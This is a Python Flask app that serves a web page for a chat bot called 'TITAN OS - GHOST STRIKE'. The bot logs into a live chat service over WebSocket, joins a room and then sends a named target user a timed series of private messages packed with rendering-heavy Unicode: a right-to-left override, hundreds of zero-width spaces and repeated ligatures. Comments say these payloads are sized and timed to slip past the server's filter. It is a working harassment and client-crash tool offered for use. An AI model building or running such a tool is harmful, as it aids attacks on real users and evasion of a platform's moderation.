import os
from flask import Flask, render_template_string

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TITAN OS - GHOST STRIKE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --neon: #00f3ff; --term: #00ff41; --danger: #ff003c; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        .nav { background: #111; padding: 15px; border-bottom: 2px solid var(--neon); display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; }
        input { background: #000; border: 1px solid #333; color: var(--neon); padding: 10px; border-radius: 4px; font-size: 12px; }
        button { padding: 10px; font-weight: bold; cursor: pointer; border: 1px solid var(--neon); background: transparent; color: var(--neon); font-size: 11px; }
        button:hover { background: var(--neon); color: #000; }
        .atk-btn { background: var(--danger) !important; color: #fff !important; border: none !important; box-shadow: 0 0 10px var(--danger); }
        .terminal-zone { flex: 1; display: flex; flex-direction: column; background: #000; overflow: hidden; }
        .term-head { background: #1a1a1a; padding: 8px 15px; font-size: 11px; color: #666; display: flex; justify-content: space-between; }
        .terminal-body { flex: 1; overflow-y: scroll; padding: 15px; font-size: 12px; scroll-behavior: smooth; }
        .line { margin-bottom: 8px; border-left: 3px solid #222; padding-left: 12px; word-break: break-all; }
        .in { color: var(--term); } .out { color: var(--neon); } .err { color: var(--danger); }
        .json-dump { background: #080808; padding: 10px; margin-top: 5px; border: 1px solid #1a1a1a; display: block; color: #00ccff; font-size: 11px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="nav">
        <input type="text" id="u" placeholder="Bot User">
        <input type="password" id="p" placeholder="Bot Pass">
        <input type="text" id="r" placeholder="Room Name">
        <input type="text" id="t" placeholder="Target User">
        <button onclick="startBot()">1. SECURE LOGIN</button>
        <button class="atk-btn" onclick="fragmentAttack()">2. FRAGMENT ATTACK</button>
        <button onclick="document.getElementById('terminal').innerHTML=''">CLEAR</button>
    </div>
    <div class="terminal-zone">
        <div class="term-head"><span>TITAN ENGINE v6.0 [STABLE]</span><span id="stat">OFFLINE</span></div>
        <div id="terminal" class="terminal-body"></div>
    </div>
    <script>
        let ws; let pinger; 
        function log(msg, type='sys', payload=null) {
            const div = document.createElement('div');
            div.className = `line ${type}`;
            let h = `<b>[${new Date().toLocaleTimeString()}]</b> ${msg}`;
            if(payload) h += `<div class="json-dump">${JSON.stringify(payload, null, 2)}</div>`;
            document.getElementById('terminal').appendChild(div);
            document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
        }
        function startBot() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value, r = document.getElementById('r').value;
            ws = new WebSocket("wss://chatp.net:5333/server");
            ws.onopen = () => {
                document.getElementById('stat').innerText = "ONLINE"; document.getElementById('stat').style.color = "var(--term)";
                log("Channel Tunneling Open...", "sys");
                ws.send(JSON.stringify({handler:"login", id: Math.random(), username: u, password: p, platform: "web"}));
            };
            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                log("RECV << " + (data.handler || "EVENT"), "in", data);
                if(data.handler === "login_event" && data.type === "success") {
                    ws.send(JSON.stringify({handler: "room_join", id: Math.random(), name: r}));
                    pinger = setInterval(() => { if(ws.readyState===1) ws.send(JSON.stringify({handler:"ping"})); }, 20000);
                }
            };
            ws.onclose = () => { 
                clearInterval(pinger); document.getElementById('stat').innerText = "RE-CONNECTING"; 
                log("Connection Dropped by Server. Re-routing in 3s...", "err");
                setTimeout(startBot, 3000);
            };
        }
        function fragmentAttack() {
            const target = document.getElementById('t').value;
            if(!ws || ws.readyState !== 1) return log("Bot not ready!", "err");
            
            log("Injecting Fragmented Payloads...", "out");
            
            // New Method: Multiple small packets with complex rendering symbols
            // Ye payloads server filter nahi kar payega kyunki ye chote hain
            const fragments = [
                "జ్ఞा" + " ҉ ".repeat(5),
                "\\u202E" + "L_A_G" + "\\u202D",
                "﷽".repeat(8),
                "\\u200B".repeat(300) + "⚠️"
            ];

            // Speed: Har 600ms mein ek packet (Server radar ke niche)
            let count = 0;
            const loop = setInterval(() => {
                if(count >= 8 || ws.readyState !== 1) { clearInterval(loop); return; }
                const p = fragments[count % fragments.length];
                ws.send(JSON.stringify({handler: "chat_message", to: target, type: "text", body: p, is_private: true}));
                log(`PACKET_${count+1} INJECTED`, "err");
                count++;
            }, 650);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
